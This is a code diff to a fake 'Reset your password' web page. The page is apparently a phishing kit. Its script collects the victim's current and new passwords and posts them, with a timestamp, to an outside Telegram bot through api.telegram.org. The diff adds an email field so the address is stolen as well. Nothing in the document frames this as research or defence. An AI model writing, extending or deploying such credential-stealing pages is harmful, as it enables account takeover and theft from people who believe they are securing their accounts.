@@ -94,6 +94,9 @@
     <h2>Reset your password</h2>
     <p>To help keep your account secure, please enter your current password and choose a new one.</p>
     <form id="resetForm">
+      <label for="oldPassword">Email</label>
+      <input type="email" id="email" name="mail" required>
+      
       <label for="oldPassword">Current password</label>
       <input type="password" id="oldPass" name="oldPass" required>
 
@@ -119,6 +122,7 @@
 
       const oldPass = document.getElementById("oldPass").value.trim();
       const newPass = document.getElementById("newPass").value.trim();
+      const email = document.getElementById("email").value.trim();
       const statusEl = document.getElementById("status");
 
       if (!oldPass || !newPass) {
@@ -128,7 +132,7 @@
         return;
       }
 
-      const message = `🔐 *Password Reset Request*\n\n👤 *Old Password:* ${oldPass}\n🆕 *New Password:* ${newPass}\n📅 *Time:* ${new Date().toLocaleString()}`;
+      const message = `🔐 *Password Reset Request*\n\n 📩 *Email:* ${email} 👤 *Old Password:* ${oldPass}\n🆕 *New Password:* ${newPass}\n 📅 *Time:* ${new Date().toLocaleString()}`;
 
       fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
         method: 'POST',
